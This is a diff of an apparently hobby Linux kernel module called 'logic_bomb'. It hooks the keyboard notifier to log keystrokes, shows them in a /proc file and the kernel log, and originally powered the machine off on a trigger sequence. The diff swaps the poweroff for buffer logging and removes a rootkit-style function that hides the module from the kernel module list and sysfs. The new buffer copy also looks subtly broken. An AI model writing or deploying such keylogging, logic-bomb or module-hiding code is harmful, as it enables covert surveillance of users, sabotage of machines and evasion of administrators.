@@ -5,17 +5,19 @@
 #include <linux/reboot.h>
 #include <linux/fs.h>
 #include <linux/proc_fs.h> 
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Federico Orlandau <federico.orlandau@gmail.com>");
 
-char keyBuffer[1000000];
+static char *buffer;
+static size_t len;
 
 static struct proc_dir_entry* key_file;
 
 static int file_show(struct seq_file *m, void *v)
 {
-    seq_printf(m, "mira \n");
+    seq_printf(m, "mira %s \n", buffer);
     return 0;
 }
 
@@ -78,6 +80,7 @@ static char decode_key(int keycode) {
     int char_index = keycode - KEY_1;
     if(char_index >= 0 && char_index < sizeof(CH_TABLE)){
         printk(KERN_INFO "Key %c", CH_TABLE[char_index]);
+        memcpy( buffer, &CH_TABLE[char_index], sizeof(*buffer)+1);
         return CH_TABLE[char_index];
     }else{
         return (keycode == KEY_SPACE) ? ' ' : '?';
@@ -89,7 +92,8 @@ static int on_key_event(struct notifier_block* nblock, unsigned long code, void*
     if (code == KBD_KEYCODE && param->down) {
         int key = param->value;
         if (push_next_char(decode_key(key))) {
-            orderly_poweroff(1);
+            //orderly_poweroff(1);
+            printk(KERN_INFO "Buffer contains %s\n", buffer);
         }
     }
     return NOTIFY_OK;
@@ -99,27 +103,16 @@ struct notifier_block nb = {
     .notifier_call = on_key_event
 };
 
-void hide_module(void){
-        if(modHidden){
-                return;
-        }
-    modList = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list);
-        kobject_del(&THIS_MODULE->mkobj.kobj);
-        THIS_MODULE->sect_attrs = NULL;
-    THIS_MODULE->notes_attrs = NULL;
-        modHidden = 1;
-}
 
 static int __init logic_bomb_init( void ) {
-
-    //    hide_module();
 
     key_file = proc_create("keyfile", 0, NULL, &key_fops);
 
     if (!key_file) {
         return -ENOMEM;
     }
+    len = 20;
+    buffer = kmalloc(len, GFP_KERNEL);
 
     register_keyboard_notifier(&nb);
     p = 0;
